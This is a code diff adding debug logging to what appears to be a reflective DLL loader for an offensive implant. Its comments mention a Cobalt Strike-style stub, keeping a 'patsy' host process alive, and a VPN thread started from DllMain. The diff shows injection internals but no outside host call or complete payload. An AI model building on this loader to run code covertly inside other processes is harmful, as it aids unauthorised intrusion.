@@ -1430,8 +1430,10 @@ ReflectiveLoader(LPVOID param)
      * /MT DLLs work without it under SEH-less flows like ours) */
 
     entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
+    vpn_dbg("loader: calling entry");
     ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
         (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
+    vpn_dbg("loader: entry returned");
 
     /* CS stub convention: rax is called as the payload entry after the
      * loader returns - park the calling thread so the patsy stays alive
@@ -1452,9 +1454,11 @@ DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 
     switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
+        vpn_dbg("DllMain: PROCESS_ATTACH");
         DisableThreadLibraryCalls(hinstDLL);
         /* Start VPN in a separate thread — DllMain must return quickly */
         thread = CreateThread(NULL, 0, vpn_main_loop, NULL, 0, NULL);
+        vpn_dbg(thread ? "DllMain: thread created" : "DllMain: CreateThread FAILED");
         if (thread) CloseHandle(thread);
         break;
     case DLL_PROCESS_DETACH:
